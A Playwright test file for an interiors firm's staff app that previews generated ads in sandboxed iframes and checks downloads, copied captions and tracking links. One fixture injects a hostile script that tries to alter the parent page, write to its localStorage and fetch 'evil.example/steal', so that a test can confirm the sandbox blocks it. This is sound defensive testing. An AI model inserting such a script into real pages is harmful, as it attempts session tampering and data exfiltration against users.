import fs from 'node:fs'
import { expect, test, type Page } from '@playwright/test'
import { installFakeStaff, signIn, type StaffWorld } from './fake-staff'

const shot = async (page: Page, name: string) => {
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390)
  const dir = process.env.SCREENSHOTS_DIR
  if (dir) await page.screenshot({ path: `${dir}/${name}.png`, fullPage: true })
}

const adHtml = (label: string, extra = '') => `<!doctype html><html><head><style>
  body{margin:0} .ad{width:1440px;height:100vh;display:flex;align-items:center;justify-content:center;
  font:500 120px sans-serif;background:#fff;color:#171717}</style>${extra}</head>
  <body><main class="ad">${label}</main></body></html>`

// A 1x1 PNG.
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64',
)

function seed(world: StaffWorld, opts: { creative?: boolean; hostile?: boolean } = {}) {
  const variant = (size: 'portrait' | 'vertical', width: number, height: number) => ({
    id: `var-${size}`,
    size,
    width,
    height,
    html_path: `ad-1/v1/${size}.html`,
    export_path: `ad-1/v1/${size}.png`,
    export_bytes: PNG.length,
  })
  world.tables.ads = [
    {
      id: 'ad-1',
      name: 'Sample: Planning a home renovation? (type only)',
      status: 'new',
      created_at: '2026-11-25T10:00:00Z',
      created_by_name: 'Ad studio (Claude session)',
      campaign_creatives: opts.creative
        ? {
            label: 'Reel 1',
            slug: 'reel-1',
            campaigns: {
              name: 'Spring kitchens',
              slug: 'spring-kitchens',
              utm_source: 'instagram',
              utm_medium: 'paid_social',
              landing_route: '/enquire',
            },
          }
        : null,
      ad_versions: [
        {
          id: 'ver-1',
          version: 1,
          caption: 'Planning a home renovation? Tell us about your project.',
          headline: 'Tell us about your project',
          button_label: 'Learn more',
          notes: null,
          created_at: '2026-11-25T10:00:00Z',
          ad_variants: [variant('portrait', 1440, 1800), variant('vertical', 1440, 2560)],
        },
      ],
    },
    {
      id: 'ad-0',
      name: 'An older ad',
      status: 'approved',
      created_at: '2026-11-20T10:00:00Z',
      created_by_name: null,
      campaign_creatives: null,
      ad_versions: [{ version: 2 }],
    },
  ]
  const hostile = opts.hostile
    ? '<script>try{parent.document.title="taken";parent.localStorage.setItem("x","1")}catch(e){};fetch("https://evil.example/steal")</script>'
    : ''
  world.adFiles.set('ad-1/v1/portrait.html', {
    body: adHtml('Feed 4:5', hostile),
    type: 'text/html',
  })
  world.adFiles.set('ad-1/v1/vertical.html', { body: adHtml('Stories 9:16'), type: 'text/html' })
  world.adFiles.set('ad-1/v1/portrait.png', { body: PNG, type: 'image/png' })
  world.adFiles.set('ad-1/v1/vertical.png', { body: PNG, type: 'image/png' })
}

test('staff see the ads, preview each size, download the image and copy the words', async ({
  page,
  context,
}) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const world = await installFakeStaff(page)
  seed(world, { creative: true })
  await page.goto('/#/ads')
  await signIn(page, 'staff@example.com', 'another long password')
  await expect(page.getByRole('heading', { name: 'Ads', level: 1 })).toBeVisible()
  const items = page.getByRole('main').getByRole('listitem')
  await expect(items.first()).toContainText('Sample: Planning a home renovation?')
  await expect(items.first()).toContainText('New')
  await expect(items.nth(1)).toContainText('Version 2')
  await shot(page, 'a1-ads-list')

  await items.first().getByRole('link').click()
  await expect(page.getByRole('tab', { name: 'Feed 4:5' })).toHaveAttribute('aria-selected', 'true')
  const frame = page.locator('iframe[title$="Feed 4:5"]')
  await expect(frame).toHaveAttribute('sandbox', '')
  await expect(frame.contentFrame().getByText('Feed 4:5')).toBeVisible()
  // True proportions: 4:5.
  const box = await frame.locator('xpath=..').boundingBox()
  expect(Math.round(((box?.width ?? 0) / (box?.height ?? 1)) * 100)).toBe(80)
  await shot(page, 'a2-ad-feed')

  const download = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Download the image (Feed 4:5)' }).click()
  const file = await download
  expect(file.suggestedFilename()).toBe(
    'q3-sample-planning-a-home-renovation-type-only-v1-4x5-1440x1800.png',
  )
  expect(fs.readFileSync((await file.path()) ?? '')).toEqual(PNG)

  await page.getByRole('tab', { name: 'Stories and Reels 9:16' }).click()
  await expect(
    page.locator('iframe[title$="9:16"]').contentFrame().getByText('Stories 9:16'),
  ).toBeVisible()
  await expect(page.getByText('Instagram covers roughly the top 14%')).toBeVisible()
  await shot(page, 'a3-ad-stories')

  await page.getByRole('button', { name: 'Copy caption' }).click()
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(
    'Planning a home renovation? Tell us about your project.',
  )
  await expect(page.getByText(/Tagged for Spring kitchens, creative Reel 1/)).toBeVisible()
  await page.getByRole('button', { name: 'Copy link' }).click()
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(
    'https://book.q3interiors.ie/?utm_source=instagram&utm_medium=paid_social&utm_campaign=spring-kitchens&utm_content=reel-1#/enquire',
  )
})

test('ad HTML cannot touch the staff session or reach the network', async ({ page }) => {
  const world = await installFakeStaff(page)
  seed(world, { hostile: true })
  const outside: string[] = []
  page.on('request', (r) => {
    if (r.url().includes('evil.example')) outside.push(r.url())
  })
  await page.goto('/#/ads/ad-1')
  await signIn(page, 'admin@example.com', 'correct horse battery staple')
  const frame = page.locator('iframe[title$="Feed 4:5"]')
  await expect(frame.contentFrame().getByText('Feed 4:5')).toBeVisible()
  await page.waitForTimeout(500)
  expect(await page.title()).toBe('Q3 Interiors Staff')
  expect(await page.evaluate(() => window.localStorage.getItem('x'))).toBeNull()
  expect(outside).toEqual([])
  // The frame is a separate, opaque origin with its own lock-down policy.
  expect(await frame.evaluate((f: HTMLIFrameElement) => f.contentDocument === null)).toBe(true)
  expect(await frame.getAttribute('srcdoc')).toContain("default-src 'none'")
  await expect(page.getByText(/not linked to a campaign creative/)).toBeVisible()
})

test('the staff header shows the wordmark with a Staff label and the Ads tab fits at 390px', async ({
  page,
}) => {
  await installFakeStaff(page)
  await page.goto('/#/settings')
  await signIn(page, 'admin@example.com', 'correct horse battery staple')
  const home = page.getByRole('link', { name: 'Q3 Interiors Staff home' })
  await expect(home.locator('img')).toHaveAttribute('src', '/brand/q3-full-black.svg')
  await expect(home).toContainText('Staff')
  await expect(
    page.getByRole('navigation', { name: 'Staff' }).getByRole('link', { name: 'Ads' }),
  ).toBeVisible()
  await shot(page, 'a4-staff-header')
})
